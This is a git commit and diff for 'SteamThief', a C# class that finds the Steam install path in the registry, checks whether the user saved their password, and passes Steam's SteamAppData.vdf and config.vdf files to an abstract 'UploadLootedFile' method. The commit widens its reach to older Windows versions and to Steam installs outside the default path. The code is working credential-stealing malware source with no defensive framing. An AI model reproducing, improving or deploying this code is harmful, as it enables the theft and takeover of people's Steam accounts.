4df8997d325f11fb664404f55d9c22168ff1dcd5
Ekachai Omkaew <ekaomk@gmail.com>
2015-03-23 00:04:14 +0700

    1. Downgrade project to framework 2.0 for support older Windows OS. 2. Remove usage namespace System.Linq, System.Threading.Tasks (for downgrade to framework 2.0) 3. Remove ProgramFilesX86() method and add getSteamInstallPath() method #node if steam user not install Steam on original, normal path. ProgramFilesX86() method will not work. #getSteamInstallPath() method will get Steam installed path in registry 4. Change regex pattern for work on any Steam user.

--- SteamThief/SteamThief.cs
+++ SteamThief/SteamThief.cs
@@ -1,10 +1,9 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.IO;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Threading.Tasks;
 
 namespace SteamThief
 {
@@ -12,41 +11,36 @@ namespace SteamThief
     {
         public const string SteamAppData = "SteamAppData.vdf";
         public const string SteamConfig = "config.vdf";
-        
-        public static string ProgramFilesX86()
+
+        private string getSteamInstallPath()
         {
-            if (8 == IntPtr.Size || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))) || Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE") == "AMD64")
-            {
-                return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
-            }
-            return Environment.GetEnvironmentVariable("ProgramFiles");
+            RegistryKey regKey = Registry.CurrentUser;
+            regKey = regKey.OpenSubKey(@"Software\Valve\Steam");
+
+            if (regKey != null)
+                return regKey.GetValue("SteamPath").ToString();
+
+            return "";
         }
         
         public abstract void UploadLootedFile(byte[] Data, string FileName);
 
         public bool Collect()
         {
-            string SteamConfigPath = Path.Combine(ProgramFilesX86(), "Steam", "config");
+            string SteamPath = getSteamInstallPath();
+            string SteamConfigPath = Path.Combine(SteamPath, "config").Replace(@"/", "\\");
             string ConfigPath = Path.Combine(SteamConfigPath, SteamConfig);
             string AppDataPath = Path.Combine(SteamConfigPath, SteamAppData);
-            if(File.Exists(ConfigPath) && File.Exists(AppDataPath))
-            {
+            if(File.Exists(ConfigPath) && File.Exists(AppDataPath)) {
                 string SteamAppDataContent = File.ReadAllText(AppDataPath);
-                if(Regex.IsMatch(SteamAppDataContent, "/RememberPassword\\W*\"1\"/"))
-                {
+                if(Regex.IsMatch(SteamAppDataContent, @"RememberPassword\W*\""1\""")) {
                     UploadLootedFile(File.ReadAllBytes(AppDataPath), SteamAppData);
                     UploadLootedFile(File.ReadAllBytes(ConfigPath), SteamConfig);
                     return true;
                 }
-                else
-                {
-                    return false;
-                }
-            }
-            else
-            {
                 return false;
             }
+            else return false;
         }
     }
 }
